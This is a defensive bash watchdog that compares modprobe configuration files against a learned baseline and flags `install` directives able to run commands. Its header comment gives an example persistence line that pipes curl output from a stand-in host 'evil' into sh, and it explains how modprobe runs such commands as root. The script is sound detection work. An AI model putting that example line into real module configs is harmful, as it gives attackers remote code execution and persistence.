#!/usr/bin/env bash
# selfdef modprobe-config-watchdog — boot + daily delta of the
# admin/runtime modprobe config dirs vs a learned baseline.
#
# /etc/modprobe.d/*.conf can carry an `install` line:
#
#   install evilmod /bin/sh -c 'curl -s http://evil | sh'
#
# When ANY component requests `evilmod` (modprobe / kmod, kernel
# autoload on a matching device, a systemd modules-load.d entry),
# modprobe RUNS the install command INSTEAD of inserting the
# module — code-exec, often as root, on module request. An
# attacker can target a module that loads on a common device or
# at boot. This is a quiet persistence vector (T1547.006).
#
# The BENIGN idiom is `install <mod> /bin/true` (or /bin/false) —
# the standard "disable this module" pattern, used by selfdef's
# own *-disable modules. We recognize it and do NOT alert on it.
#
# Watched (admin/runtime, attacker-writable):
#   /etc/modprobe.d   /run/modprobe.d
# NOT /usr/lib/modprobe.d — package-managed; integrity-sentinel
# covers package-owned content (mirrors the udev-rules decision).
#
# Records (each line: kind<TAB>key<TAB>value):
#   file:<conf>:<sha12>        — hash of each .conf
#   install:<mod>:<cmd0>       — first token of each install cmd
#   blacklist:<mod>            — each blacklist entry (benign;
#                                tracked so removals surface)
#
# Severity:
#   ok    → no delta
#   warn  → a conf hash changed / a blacklist add/remove
#   alert → a NEW exec-capable install command (anything other
#           than /bin/true|/bin/false), OR an install command
#           under /tmp /home /dev/shm, world-writable, or bare

set -u

PROFILE="${SELFDEF_MODPROBE_PROFILE:-report}"
BASELINE="${SELFDEF_MODPROBE_BASELINE:-/var/lib/selfdef/modprobe-config-baseline.tsv}"
DIRS="${SELFDEF_MODPROBE_DIRS:-/etc/modprobe.d /run/modprobe.d}"

current="$(mktemp)"
trap 'rm -f "$current" "${current}.sorted"' EXIT

declare -a suspicious=()

# The benign disable commands (selfdef + distro idiom).
is_benign_cmd() {
    case "$1" in
        /bin/true|/bin/false|/sbin/nologin|true|false) return 0 ;;
        *) return 1 ;;
    esac
}
is_suspicious_cmd() {
    local c="$1"
    case "$c" in
        /tmp/*|/tmp|/var/tmp*|/dev/shm*|/home/*) return 0 ;;
        /*) # -L: follow symlinks (a symlink's own 0777 is meaningless
            # on Linux; the executed target's mode is what matters).
            [[ -e "$c" && "$(stat -L -c '%a' "$c" 2>/dev/null)" =~ [2367]$ ]] && return 0
            return 1 ;;
        *) return 0 ;;  # bare / relative command — abnormal
    esac
}

for d in $DIRS; do
    [[ -d "$d" ]] || continue
    for f in "$d"/*.conf; do
        [[ -f "$f" ]] || continue
        h=$(sha256sum "$f" 2>/dev/null | awk '{print substr($1,1,12)}')
        printf 'file\t%s\t%s\n' "$f" "$h" >> "$current"
        while IFS= read -r line; do
            line="${line%%#*}"
            # read -ra (NOT `set -- $line`) — alias lines like
            # `alias net-pf-* off` would glob-expand the `*` against
            # the cwd under word-splitting.
            read -r -a F <<< "$line"
            [[ ${#F[@]} -eq 0 ]] && continue
            case "${F[0]}" in
                install)
                    # install <modulename> <command...>
                    mod="${F[1]:-}"; cmd0="${F[2]:-}"
                    [[ -z "$mod" ]] && continue
                    printf 'install\t%s\t%s\n' "$mod" "${cmd0:-(none)}" >> "$current"
                    if [[ -n "$cmd0" ]] && ! is_benign_cmd "$cmd0"; then
                        # An exec-capable install command. Flag it;
                        # escalate further if path is suspicious.
                        if is_suspicious_cmd "$cmd0"; then
                            suspicious+=("$(basename "$f"):${mod}=>${cmd0}:WRITABLE")
                        else
                            suspicious+=("$(basename "$f"):${mod}=>${cmd0}")
                        fi
                    fi
                    ;;
                blacklist)
                    [[ -n "${F[1]:-}" ]] && printf 'blacklist\t%s\n' "${F[1]}" >> "$current"
                    ;;
            esac
        done < "$f"
    done
done

{ sort -u > "${current}.sorted"; } < "$current" && mv "${current}.sorted" "$current"
cur_count=$(wc -l < "$current" | tr -d ' ')

if (( ${#suspicious[@]} > 0 )); then
    mapfile -t suspicious < <(printf '%s\n' "${suspicious[@]}" | sort -u)
fi

if [[ ! -f "$BASELINE" ]]; then
    mkdir -p "$(dirname "$BASELINE")"
    cp "$current" "$BASELINE"
    chmod 0600 "$BASELINE"
    susp_str=$(IFS='|'; echo "${suspicious[*]:-}")
    sev="ok"; [[ ${#suspicious[@]} -gt 0 ]] && sev="alert"
    logger -t selfdef-modprobe-config -- "$(printf '{"tag":"selfdef-modprobe-config","severity":"%s","event":"baseline_initial","profile":"%s","entries":%d,"suspicious":"%s"}' "$sev" "$PROFILE" "$cur_count" "$susp_str")"
    [[ "$PROFILE" == "enforce" && "$sev" != "ok" ]] && exit 1
    exit 0
fi

added=$(comm -23 "$current" <(sort -u "$BASELINE"))
removed=$(comm -13 "$current" <(sort -u "$BASELINE"))
n_added=$(printf '%s' "$added"   | grep -c . || true)
n_removed=$(printf '%s' "$removed" | grep -c . || true)
install_added=$(printf '%s' "$added" | grep -c '^install' || true)

severity="ok"; event="modprobe_config_intact"
if (( ${#suspicious[@]} > 0 )); then
    severity="alert"; event="modprobe_config_exec_install"
elif (( install_added > 0 )); then
    # A new install directive that IS benign (/bin/true) still
    # warrants a warn — module disabling changes attack surface.
    severity="warn"; event="modprobe_config_install_added"
elif (( n_added > 0 || n_removed > 0 )); then
    severity="warn"; event="modprobe_config_changed"
fi

added_sample=$(printf '%s' "$added"   | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
removed_sample=$(printf '%s' "$removed" | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
susp_str=$(IFS='|'; echo "${suspicious[*]:-}")

json=$(printf '{"tag":"selfdef-modprobe-config","severity":"%s","event":"%s","profile":"%s","added":%d,"removed":%d,"suspicious":"%s","added_sample":"%s","removed_sample":"%s"}' \
    "$severity" "$event" "$PROFILE" "$n_added" "$n_removed" "$susp_str" "$added_sample" "$removed_sample")
logger -t selfdef-modprobe-config -- "$json"

[[ -n "$added" ]]   && printf '%s\n' "$added"   | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-modprobe-config-detail -- "ADDED ${k} ${p} ${v}"; done
[[ -n "$removed" ]] && printf '%s\n' "$removed" | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-modprobe-config-detail -- "REMOVED ${k} ${p} ${v}"; done

cp "$current" "$BASELINE" 2>/dev/null || true

if [[ "$PROFILE" == "enforce" && "$severity" != "ok" ]]; then
    exit 1
fi
exit 0
